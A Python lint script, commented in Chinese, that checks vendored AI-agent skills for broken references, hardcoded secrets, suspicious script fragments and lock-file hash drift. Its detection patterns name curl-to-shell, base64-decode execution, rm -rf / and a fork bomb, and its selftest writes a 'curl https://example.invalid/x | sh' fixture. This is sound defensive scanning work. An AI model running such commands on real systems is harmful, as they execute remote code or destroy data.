#!/usr/bin/env python3
"""外部技能（vendored）的放宽判据检查器 —— ai-workflow 本体自检的**外部技能对应物**。

## 为什么另起一套，而不是复用 `checks.py skill`

`checks.py skill` 是**为宿主本体设计的**：它还会查 `assets/templates` 的 schema、
口径守卫、平台门控、指标幂等等与兼容性无关的项。拿它去卡上游 vendored 技能，
会产出一屏噪音 FAIL，而噪音的结局是判据被整体绕过。

但完全不给外部技能任何机器检查，就等于把它们置于「**未检测**」状态 ——
未检测不是通过。故本脚本只保留四类**与第三方兼容性真正相关**的判据，并分档报。

## 判据（四类）

| # | 判据 | 分级 |
| --- | --- | --- |
| 1 | frontmatter 可解析且含 name / description | 缺 → FAIL |
| 2 | 反引号引用可解析（分档，见下） | 真断链 → FAIL；已登记提及 → SKIP |
| 3 | 无硬编码密钥 | 命中 → FAIL |
| 4 | 无可疑/混淆脚本片段 | 命中 → WARN（不是 FAIL，见下） |
| 5 | lock 与磁盘 sha256 一致（`--verify-lock`） | 不一致 → FAIL |

**判据 2 的分档理由**：上游技能正文里的反引号 `.md` 大多是**对被整合项目仓文件的提及**
（CONTEXT.md、AGENTS.md、CONTRIBUTING.md 之类），不是指向技能自身。硬套宿主判据会
全数误报。故：能在技能内解析到 → OK；在 lock 的 `reference_mentions` 里登记过 → SKIP
并计数；**两者都不是**（既没解析到、也没登记）→ FAIL —— 这条才抓真断链。

**判据 4 为何只 WARN**：`git-guardrails-claude-code` 这类技能的**正当内容就是**
「识别并拦截危险 git 命令」，正文里必然出现危险命令的字面量。命中即 FAIL 会把
「技能在讲怎么防」误判成「技能在干坏事」。故只 WARN 并逐条列出，由人判定。

## 用法

    python scripts/external_skill_lint.py                    # 扫描 <技能库根>/.vendor/*.lock.json 并逐一检查
    python scripts/external_skill_lint.py --root <技能库根>
    python scripts/external_skill_lint.py --verify-lock       # 加做 lock 与磁盘 sha256 一致性检查
    python scripts/external_skill_lint.py --skill tdd         # 只查一个（跨全部 lock 解析归属）
    python scripts/external_skill_lint.py --lock <path>       # 只用一个 lock（排障用）

退出码：0 = 无 FAIL；1 = 有 FAIL；2 = 前置条件不满足（lock 缺失/不可解析）。

## 诚实边界

- **只查 lock 里登记的技能**，不遍历技能库全量 —— 用户自建技能与宿主本体不在范围内。
- **多上游（v4.25.0）**：缺省遍历 `.vendor/*.lock.json`（此前硬编码单一 mattpocock lock）。
  每个 lock 自带 `skills` / `reference_mentions` / `files`，故**豁免与一致性按 lock 分别判定**，
  不会把 A 上游的登记拿去豁免 B 上游的断链。
- **不判内容质量**：判据只覆盖结构、引用、密钥、可疑片段四类可枚举特征；
  技能写得对不对、判据讲得好不好，机器没有 oracle。
- **SKIP 不是通过**：已登记的引用提及是「按约定豁免」，不是「验证过它没问题」。
"""
from __future__ import annotations

import argparse
import hashlib
import json
import re
import sys
from pathlib import Path

# 与宿主 checks_core.py 保持逐字一致的引用判据（外部技能用的是同一套正文写法）
REF_PATTERN = re.compile(r"`([A-Za-z0-9_./\u4e00-\u9fff-]+\.(?:md|yaml|py|ps1))`")
REF_WHITELIST = {"plan.yaml", "Ledger.md", "memory/YYYY-MM-DD.md", "README.md",
                 "USER.md", "MEMORY.md", "kb.py"}
REF_EXTERNAL_PREFIXES = (".workbuddy/", ".scratch/", "历史数据集/", "backend/",
                         "frontend/", "indicators/", "daily_scheduler/", "tests/")
REF_PLACEHOLDER = re.compile(r"N{2,}|Y{2,}|M{2,}|D{2,}|<|>|\{|\}|xxx|XXX")

SECRET_PATTERNS = (
    (r"\bsk-[A-Za-z0-9]{16,}\b", "OpenAI 风格密钥"),
    (r"\bgh[pousr]_[A-Za-z0-9]{20,}\b", "GitHub token"),
    (r"\bAKIA[0-9A-Z]{16}\b", "AWS Access Key ID"),
    (r"-----BEGIN [A-Z ]*PRIVATE KEY-----", "私钥块"),
    (r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b", "Slack token"),
    (r"\bAIza[0-9A-Za-z_-]{30,}\b", "Google API key"),
)

SUSPICIOUS_PATTERNS = (
    (r"curl[^\n|]{0,200}\|\s*(?:ba|z)?sh", "管道执行远端脚本"),
    (r"wget[^\n|]{0,200}\|\s*(?:ba|z)?sh", "管道执行远端脚本"),
    (r"base64\s+(?:-d|--decode)[^\n|]{0,80}\|\s*(?:ba|z)?sh", "base64 解码后执行"),
    (r"\beval\s*[\"']?\$\(", "eval 命令替换"),
    (r"rm\s+-rf\s+/(?:\s|$|\*)", "删除根目录"),
    (r"chmod\s+(?:-R\s+)?777", "过宽权限"),
    (r":\(\)\s*\{\s*:\|:&\s*\}\s*;:", "fork bomb"),
)

TEXT_EXT = {".md", ".txt", ".yaml", ".yml", ".sh", ".py", ".js", ".ts", ".json"}

MARKS = {"OK": "[ OK ]", "FAIL": "[FAIL]", "SKIP": "[SKIP]", "WARN": "[WARN]"}
results: list[tuple[str, str, str]] = []


def add(status: str, item: str, detail: str = "") -> None:
    results.append((status, item, detail))
    line = f"{MARKS[status]} {item}"
    if detail:
        line += f" — {detail}"
    print(line)


def resolve(ref: str, skill_dir: Path) -> Path | None:
    """复刻宿主 checks_core._resolve：技能内四个位置。"""
    for cand in (skill_dir / ref, skill_dir / "scripts" / ref,
                 skill_dir / "assets" / ref, skill_dir / "references" / ref):
        if cand.exists():
            return cand
    return None


def sha256(p: Path) -> str:
    h = hashlib.sha256()
    h.update(p.read_bytes())
    return h.hexdigest()


def check_frontmatter(skill_dir: Path, name: str) -> bool:
    smd = skill_dir / "SKILL.md"
    if not smd.is_file():
        add("FAIL", f"{name} · SKILL.md 存在", "未找到 SKILL.md")
        return False
    text = smd.read_text(encoding="utf-8", errors="replace")
    m = re.match(r"\A---[ \t]*\r?\n(.*?)\r?\n---[ \t]*(?:\r?\n|\Z)", text, re.S)
    if not m:
        add("FAIL", f"{name} · frontmatter 可解析", "未找到以 --- 包裹的块")
        return False
    fm = m.group(1)
    missing = [k for k in ("name:", "description:") if k not in fm]
    if missing:
        add("FAIL", f"{name} · frontmatter 必需键", "缺 " + ", ".join(k.rstrip(":") for k in missing))
        return False
    add("OK", f"{name} · frontmatter 可解析")
    return True


def check_refs(skill_dir: Path, name: str, exempt: set[tuple[str, str]]) -> None:
    """判据 2：引用分档。exempt 为 lock 登记的 (skill, ref) 提及集合。"""
    ok_n = skip_n = 0
    bad: list[str] = []
    seen: set[str] = set()
    for p in sorted(skill_dir.rglob("*.md")):
        for ref in REF_PATTERN.findall(p.read_text(encoding="utf-8", errors="replace")):
            if ref in seen or REF_PLACEHOLDER.search(ref):
                continue
            seen.add(ref)
            if resolve(ref, skill_dir) is not None:
                ok_n += 1
                continue
            if ref in REF_WHITELIST or ref.startswith(REF_EXTERNAL_PREFIXES):
                skip_n += 1
                continue
            if (name, ref) in exempt:
                skip_n += 1
                continue
            bad.append(f"{ref}（来自 {p.relative_to(skill_dir).as_posix()}）")
    if bad:
        add("FAIL", f"{name} · 引用完整性", "未登记断链：" + "；".join(bad))
    else:
        add("OK", f"{name} · 引用完整性",
            f"技能内可解析 {ok_n} 条；按约定豁免 {skip_n} 条（豁免 ≠ 已验证）")


def check_secrets_and_scripts(skill_dir: Path, name: str) -> None:
    secrets: list[str] = []
    suspicious: list[str] = []
    for p in sorted(skill_dir.rglob("*")):
        if not p.is_file() or p.suffix.lower() not in TEXT_EXT:
            continue
        text = p.read_text(encoding="utf-8", errors="replace")
        rel = p.relative_to(skill_dir).as_posix()
        for pat, label in SECRET_PATTERNS:
            if re.search(pat, text):
                secrets.append(f"{label} @ {rel}")
        for pat, label in SUSPICIOUS_PATTERNS:
            if re.search(pat, text):
                suspicious.append(f"{label} @ {rel}")
    if secrets:
        add("FAIL", f"{name} · 无硬编码密钥", "；".join(sorted(set(secrets))))
    else:
        add("OK", f"{name} · 无硬编码密钥")
    if suspicious:
        add("WARN", f"{name} · 可疑脚本片段",
            "；".join(sorted(set(suspicious))) + "（可能属技能正当内容，须人判）")


def check_lock(root: Path, lock: dict) -> None:
    bad = []
    for f in lock.get("files", []):
        p = root / f["path"]
        if not p.is_file():
            bad.append(f"{f['path']} 缺失")
            continue
        actual = sha256(p)
        if actual != f["sha256"]:
            bad.append(f"{f['path']} sha256 不一致")
    label = f"lock 与磁盘一致性（{lock.get('vendor', '?')}）"
    if bad:
        add("FAIL", label, "；".join(bad[:10]) +
            (f"（共 {len(bad)} 项）" if len(bad) > 10 else ""))
    else:
        add("OK", label, f"{len(lock.get('files', []))} 个文件逐一对上")


def _load_locks(root: Path, pinned: str | None) -> list[dict] | None:
    """载入待检 lock 列表。pinned 给定时只载入它；否则扫描 <root>/.vendor/*.lock.json。

    多上游（v4.25.0）：每个 lock 自成一个判定域（skills / reference_mentions / files
    都按 lock 分别取），避免跨上游的豁免串用。
    """
    if pinned:
        paths = [Path(pinned)]
    else:
        paths = sorted((root / ".vendor").glob("*.lock.json"))
        if not paths:
            print(f"[ERROR] 未找到任何 lock：{root / '.vendor'}/*.lock.json")
            return None
    locks: list[dict] = []
    for p in paths:
        if not p.is_file():
            print(f"[ERROR] lock 不存在：{p}")
            return None
        try:
            lock = json.loads(p.read_text(encoding="utf-8"))
        except json.JSONDecodeError as e:
            print(f"[ERROR] lock 不可解析：{p} — {e}")
            return None
        lock["_lock_path"] = str(p)
        locks.append(lock)
    return locks


# ── --selftest：四类判据回归（临时目录造最小假技能+假 lock，不触碰真实技能库）─────

def _selftest() -> int:
    """回归五类判据：frontmatter / 引用分档 / 密钥 / 可疑片段 / lock sha256。

    造法：`tempfile.TemporaryDirectory()` 下建假技能目录与假 `.vendor/*.lock.json`。
    不联网、不读真实凭据；密钥用例是**拼出来的假串**（`sk-` + 重复字母），不是真密钥。
    含阴性对照：缺 description、未登记断链、硬编码密钥、sha256 不符 —— 都必须 FAIL。
    """
    import contextlib
    import io
    import json
    import tempfile

    n_pass = n_all = 0

    def check(case, actual, expect) -> None:
        nonlocal n_pass, n_all
        n_all += 1
        hit = actual == expect
        n_pass += 1 if hit else 0
        print(f"[{'PASS' if hit else 'MISS'}] {case}：实际={actual} 期望={expect}")

    def grab(fn, *a):
        """跑一个 check_* 函数，返回 (返回值, results 快照)；屏蔽其内部 print。"""
        results.clear()
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            out = fn(*a)
        return out, list(results)

    def items(rs, st):
        return [r[1] for r in rs if r[0] == st]

    def count(rs, st):
        return sum(1 for r in rs if r[0] == st)

    def run_main(argv):
        old, buf = sys.argv, io.StringIO()
        sys.argv = ["external_skill_lint.py", *argv]
        results.clear()
        try:
            with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(buf):
                rc = main()
        finally:
            sys.argv = old
        return rc, buf.getvalue()

    FM = "---\nname: demo\ndescription: 演示用途\n---\n正文\n"

    with tempfile.TemporaryDirectory() as td:
        base = Path(td)

        # ① frontmatter
        ok_dir = base / "ok"
        ok_dir.mkdir()
        (ok_dir / "SKILL.md").write_text(FM + "见 `notes.md`\n", encoding="utf-8")
        (ok_dir / "notes.md").write_text("# notes\n", encoding="utf-8")
        ret, rs = grab(check_frontmatter, ok_dir, "ok")
        check("frontmatter 正常 → True 且无 FAIL", (ret, items(rs, "FAIL")), (True, []))

        d = base / "bad"
        d.mkdir()
        (d / "SKILL.md").write_text("---\nname: bad\n---\n正文\n", encoding="utf-8")
        ret, rs = grab(check_frontmatter, d, "bad")
        check("阴性 缺 description → FAIL 且不继续查引用",
              (ret, items(rs, "FAIL")), (False, ["bad · frontmatter 必需键"]))

        d = base / "empty"
        d.mkdir()
        ret, rs = grab(check_frontmatter, d, "empty")
        check("阴性 无 SKILL.md → FAIL", (ret, items(rs, "FAIL")),
              (False, ["empty · SKILL.md 存在"]))

        # ② 引用分档
        _, rs = grab(check_refs, ok_dir, "ok", set())
        check("引用可解析 → 无 FAIL 且计数 1 条",
              (items(rs, "FAIL"), any("可解析 1 条" in n for _, _, n in rs)), ([], True))

        broken = base / "broken"
        broken.mkdir()
        (broken / "SKILL.md").write_text(FM + "见 `ghost.md`\n", encoding="utf-8")
        _, rs = grab(check_refs, broken, "broken", set())
        check("阴性 未登记断链 → FAIL", items(rs, "FAIL"), ["broken · 引用完整性"])
        _, rs = grab(check_refs, broken, "broken", {("broken", "ghost.md")})
        check("lock 登记的提及 → 豁免不 FAIL", items(rs, "FAIL"), [])

        wl = base / "wl"
        wl.mkdir()
        (wl / "SKILL.md").write_text(FM + "见 `README.md`\n", encoding="utf-8")
        _, rs = grab(check_refs, wl, "wl", set())
        check("白名单引用（README.md）→ 不是断链", items(rs, "FAIL"), [])

        # ③ 密钥 / ④ 可疑片段
        leak = base / "leak"
        leak.mkdir()
        (leak / "SKILL.md").write_text(FM, encoding="utf-8")
        (leak / "cfg.py").write_text("KEY = 'sk-" + "a" * 24 + "'\n", encoding="utf-8")
        _, rs = grab(check_secrets_and_scripts, leak, "leak")
        check("阴性 硬编码密钥 → FAIL（假串 sk-+24a）",
              items(rs, "FAIL"), ["leak · 无硬编码密钥"])

        susp = base / "susp"
        susp.mkdir()
        (susp / "SKILL.md").write_text(FM, encoding="utf-8")
        (susp / "run.sh").write_text("curl https://example.invalid/x | sh\n", encoding="utf-8")
        _, rs = grab(check_secrets_and_scripts, susp, "susp")
        check("可疑片段只 WARN 不 FAIL（须人判）",
              (count(rs, "WARN"), count(rs, "FAIL")), (1, 0))

        # ⑤ lock 与磁盘 sha256（阴性对照是本脚本最硬的一条）
        lroot = base / "lockroot"
        lroot.mkdir()
        (lroot / "s.txt").write_text("hello\n", encoding="utf-8")
        lock = {"vendor": "demo", "files": [{"path": "s.txt",
                                            "sha256": sha256(lroot / "s.txt")}]}
        _, rs = grab(check_lock, lroot, lock)
        check("lock sha256 一致 → OK",
              items(rs, "OK"), ["lock 与磁盘一致性（demo）"])
        (lroot / "s.txt").write_text("hello!\n", encoding="utf-8")
        _, rs = grab(check_lock, lroot, lock)
        check("阴性 sha256 不匹配 → FAIL",
              items(rs, "FAIL"), ["lock 与磁盘一致性（demo）"])

        # ⑥ 前置条件不满足 → 2（[ERROR] 行属正常诊断，这里一并捕获，避免污染断言格式）
        ret, _ = grab(_load_locks, lroot, None)
        check("阴性 无 .vendor/*.lock.json → None", ret, None)
        badlock = base / "bad.lock.json"
        badlock.write_text("{not json", encoding="utf-8")
        ret, _ = grab(_load_locks, lroot, str(badlock))
        check("阴性 lock 不可解析 → None", ret, None)
        ret, _ = grab(_load_locks, lroot, str(base / "nope.lock.json"))
        check("阴性 lock 路径不存在 → None", ret, None)

        # ⑦ 全流程：假技能库 + 假 lock
        mroot = base / "skills"
        (mroot / ".vendor").mkdir(parents=True)
        sd = mroot / "s"
        sd.mkdir()
        (sd / "SKILL.md").write_text(FM + "见 `notes.md`\n", encoding="utf-8")
        (sd / "notes.md").write_text("# n\n", encoding="utf-8")
        lockj = {
            "vendor": "demo", "upstream_rev_short": "abc1234",
            "upstream_date": "2026-01-01", "license": "MIT",
            "skills": ["s"], "reference_mentions": [],
            "files": [{"path": "s/SKILL.md", "sha256": sha256(sd / "SKILL.md")}],
        }
        (mroot / ".vendor" / "demo.lock.json").write_text(
            json.dumps(lockj, ensure_ascii=False), encoding="utf-8")

        rc, _ = run_main(["--root", str(mroot), "--verify-lock"])
        check("全流程（干净库 + --verify-lock）rc 0", rc, 0)
        (sd / "SKILL.md").write_text(FM + "改一行\n", encoding="utf-8")
        rc, _ = run_main(["--root", str(mroot), "--verify-lock"])
        check("阴性 磁盘漂移 → --verify-lock rc 1", rc, 1)
        rc, _ = run_main(["--root", str(mroot), "--skill", "ghost"])
        check("阴性 --skill 未登记 → rc 2", rc, 2)

    print(f"=== selftest：{n_pass}/{n_all} ===")
    return 0 if n_pass == n_all else 1


def main() -> int:
    ap = argparse.ArgumentParser(description="外部 vendored 技能的放宽判据检查器")
    ap.add_argument("--root", default=str(Path.home() / ".workbuddy" / "skills"),
                    help="技能库根（默认 ~/.workbuddy/skills）")
    ap.add_argument("--lock", default=None,
                    help="只用这一个 lock（默认扫描 <root>/.vendor/*.lock.json，多上游逐一检查）")
    ap.add_argument("--skill", default=None, help="只查指定技能")
    ap.add_argument("--verify-lock", action="store_true", help="加做 lock 与磁盘 sha256 一致性检查")
    ap.add_argument("--selftest", action="store_true",
                    help="运行内置自检（含阴性对照；只在临时目录造假技能与假 lock）")
    args = ap.parse_args()

    if args.selftest:
        return _selftest()

    root = Path(args.root)
    locks = _load_locks(root, args.lock)
    if locks is None:
        return 2

    # 跨 lock 建立「技能 → 所属 lock」映射；一个技能只允许出现在一个 lock 里
    skill_to_lock: dict[str, dict] = {}
    for lock in locks:
        for n in lock.get("skills", []):
            skill_to_lock[n] = lock

    if args.skill:
        if args.skill not in skill_to_lock:
            print(f"[ERROR] 技能 {args.skill} 不在任何 lock 登记范围内")
            return 2
        order = [args.skill]
    else:
        order = list(skill_to_lock.keys())

    print("=== 外部技能放宽判据检查 ===")
    for lock in locks:
        print(f"来源：{lock.get('vendor')} @ {lock.get('upstream_rev_short')}"
              f"（{lock.get('upstream_date')}）｜许可 {lock.get('license')}"
              f"｜lock {Path(lock['_lock_path']).name}"
              f"｜登记 {len(lock.get('skills', []))} 个技能")
    print(f"范围：{len(order)} 个已登记技能（lock 口径；不含宿主本体与用户自建技能）\n")

    for name in order:
        lock = skill_to_lock[name]
        exempt = {(m["skill"], m["ref"]) for m in lock.get("reference_mentions", [])}
        d = root / name
        if not d.is_dir():
            add("FAIL", f"{name} · 目录存在", "lock 已登记但磁盘无此目录")
            continue
        if check_frontmatter(d, name):
            check_refs(d, name, exempt)
        check_secrets_and_scripts(d, name)

    if args.verify_lock:
        for lock in locks:
            print()
            check_lock(root, lock)

    n_fail = sum(1 for s, _, _ in results if s == "FAIL")
    n_ok = sum(1 for s, _, _ in results if s == "OK")
    n_skip = sum(1 for s, _, _ in results if s == "SKIP")
    n_warn = sum(1 for s, _, _ in results if s == "WARN")
    print(f"\n=== 结果：通过 {n_ok}，FAIL={n_fail}，SKIP={n_skip}，WARN={n_warn} ===")
    if n_warn:
        print("⚠️ WARN 项须人工判定；WARN 不是通过，也不是失败。")
    return 1 if n_fail else 0


if __name__ == "__main__":
    sys.exit(main())
